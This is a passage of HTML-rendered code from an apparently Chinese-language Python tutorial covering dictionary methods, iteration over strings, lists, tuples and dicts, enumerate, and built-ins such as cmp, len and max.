class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>dict01<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token number\">2</span><span class=\"token operator\">></span>keys</pre></td></tr><tr><td data-num=\"73\"></td><td><pre>返回一个包含字典所有KEY的列表</pre></td></tr><tr><td data-num=\"74\"></td><td><pre>dict01 <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'张三'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'age'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sex'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'m'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>keys <span class=\"token operator\">=</span> dict01<span class=\"token punctuation\">.</span>keys<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>keys<span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"77\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'age'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sex'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre></pre></td></tr><tr><td data-num=\"79\"></td><td><pre></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token number\">3</span><span class=\"token operator\">></span>values</pre></td></tr><tr><td data-num=\"81\"></td><td><pre>返回一个包含字典所有value的列表</pre></td></tr><tr><td data-num=\"82\"></td><td><pre>ict01 <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'张三'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'age'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sex'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'m'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>values <span class=\"token operator\">=</span> dict01<span class=\"token punctuation\">.</span>values<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>values<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"85\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'张三'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'m'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre></pre></td></tr><tr><td data-num=\"87\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token number\">4</span><span class=\"token operator\">></span>items</pre></td></tr><tr><td data-num=\"88\"></td><td><pre>返回一个包含所有（键，值）元祖的列表</pre></td></tr><tr><td data-num=\"89\"></td><td><pre>dict01 <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'张三'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'age'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sex'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'m'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>items <span class=\"token operator\">=</span> dict01<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>items<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"92\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'张三'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'age'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'sex'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'m'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><h4 id=\"字典遍历\"><a class=\"markdownIt-Anchor\" href=\"#字典遍历\">#</a> <span class=\"label success\">字典遍历</span></h4>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>字符串遍历</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> a_str <span class=\"token operator\">=</span> <span class=\"token string\">\"hello itcast\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">for</span> char <span class=\"token keyword\">in</span> a_str<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>     <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>char<span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>h e l l o   i t c a s t</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>列表遍历</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> a_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">for</span> num <span class=\"token keyword\">in</span> a_list<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>     <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token number\">1</span> <span class=\"token number\">2</span> <span class=\"token number\">3</span> <span class=\"token number\">4</span> <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>元组遍历</pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> a_turple <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">for</span> num <span class=\"token keyword\">in</span> a_turple<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>     <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token number\">1</span> <span class=\"token number\">2</span> <span class=\"token number\">3</span> <span class=\"token number\">4</span> <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>字典遍历</pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token number\">1</span><span class=\"token operator\">></span> 遍历字典的key（键）</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>dict01 <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'张三'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'age'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sex'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'m'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">for</span> key <span class=\"token keyword\">in</span> dict01<span class=\"token punctuation\">.</span>keys<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>结果：</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>name</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>age</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>sex</pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token number\">2</span><span class=\"token operator\">></span> 遍历字典的value（值）</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>dict01 <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'张三'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'age'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sex'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'m'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">for</span> value <span class=\"token keyword\">in</span> dict01<span class=\"token punctuation\">.</span>values<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>张三</pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token number\">18</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>m</pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token number\">3</span><span class=\"token operator\">></span> 遍历字典的项（元素）</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>dict01 <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'张三'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'age'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sex'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'m'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">for</span> item <span class=\"token keyword\">in</span> dict01<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>结果：</pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'张三'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token string\">'age'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token string\">'sex'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'m'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token number\">4</span><span class=\"token operator\">></span> 遍历字典的key<span class=\"token operator\">-</span>value（键值对）</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>dict01 <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'张三'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'age'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sex'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'m'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token keyword\">for</span> key<span class=\"token punctuation\">,</span> value <span class=\"token keyword\">in</span> dict01<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'%s--%s'</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>结果：</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>name<span class=\"token operator\">-</span><span class=\"token operator\">-</span>张三</pre></td></tr><tr><td data-num=\"58\"></td><td><pre>age<span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token number\">18</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>sex<span class=\"token operator\">-</span><span class=\"token operator\">-</span>m</pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>想一想，如何实现带下标索引的遍历</pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token builtin\">enumerate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 函数用于将一个可遍历的数据对象<span class=\"token punctuation\">(</span>如列表、元组或字符串<span class=\"token punctuation\">)</span>组</pre></td></tr><tr><td data-num=\"63\"></td><td><pre>合为一个索引序列，同时列出数据和数据下标，一般用在 <span class=\"token keyword\">for</span> 循环当中。</pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> chars <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'b'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'c'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'d'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">for</span> i<span class=\"token punctuation\">,</span> <span class=\"token builtin\">chr</span> <span class=\"token keyword\">in</span> <span class=\"token builtin\">enumerate</span><span class=\"token punctuation\">(</span>chars<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>     <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d %s\"</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token number\">0</span> a</pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token number\">1</span> b</pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token number\">2</span> c</pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token number\">3</span> d</pre></td></tr></table></figure><h3 id=\"公共方法\"><a class=\"markdownIt-Anchor\" href=\"#公共方法\">#</a> <span class=\"label success\">公共方法</span></h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span> \t<span class=\"token builtin\">cmp</span><span class=\"token punctuation\">(</span>item1<span class=\"token punctuation\">,</span> item2<span class=\"token punctuation\">)</span> \t比较两个值</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">2</span> \t<span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span> \t计算容器中元素个数</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">3</span> \t<span class=\"token builtin\">max</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span> \t返回容器中元素最大值</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">4</span> \t<span class=\"token builtin\">min</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span> \t返回容器中元素最小值</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">5</span> \t<span class=\"token keyword\">del</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span> \t删除变量</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token builtin\">cmp</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">cmp</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"itcast\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">cmp</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"itcast\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">cmp</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"itcast\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"itcast\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">cmp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">cmp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">cmp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">cmp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"b\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">cmp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">cmp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"b\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>注意：<span class=\"token builtin\">cmp</span>在比较字典数据时，先比较键，再比较值。</pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token builtin\">len</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello itcast\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token number\">12</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"b\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>注意：<span class=\"token builtin\">len</span>在操作字典数据时，返回的是键值对个数。</pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token builtin\">max</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">max</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello itcast\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token string\">'t'</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">max</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">522</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token number\">522</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">max</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"b\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token string\">'b'</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token 